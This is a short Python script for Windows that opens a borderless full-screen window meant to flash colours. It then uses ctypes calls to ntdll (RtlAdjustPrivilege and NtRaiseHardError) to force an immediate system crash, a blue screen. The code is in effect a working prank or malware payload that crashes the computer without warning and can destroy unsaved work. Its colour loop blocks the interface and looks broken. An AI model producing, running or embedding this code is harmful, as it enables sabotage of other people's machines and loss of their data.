import tkinter as tk
import time

def change_color():
    colors = ["red", "green", "blue", "yellow", "purple"]
    current_color = 0
    while True:
        vwin.config(bg=colors[current_color])
        current_color = (current_color + 1) % len(colors)
        time.sleep(0.5)

vwin = tk.Tk()
vwin.overrideredirect(True)
vwin.geometry("{0}x{1}+0+0".format(vwin.winfo_screenwidth(), vwin.winfo_screenheight()))
vwin.after(1, change_color)

time.sleep(1)

from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref

nullptr = POINTER(c_int)()

windll.ntdll.RtlAdjustPrivilege(
    c_uint(19), 
    c_uint(1), 
    c_uint(0), 
    byref(c_int())
)

windll.ntdll.NtRaiseHardError(
    c_ulong(0xC000007B), 
    c_ulong(0), 
    nullptr, 
    nullptr, 
    c_uint(6), 
    byref(c_uint())
)

vwin.mainloop()
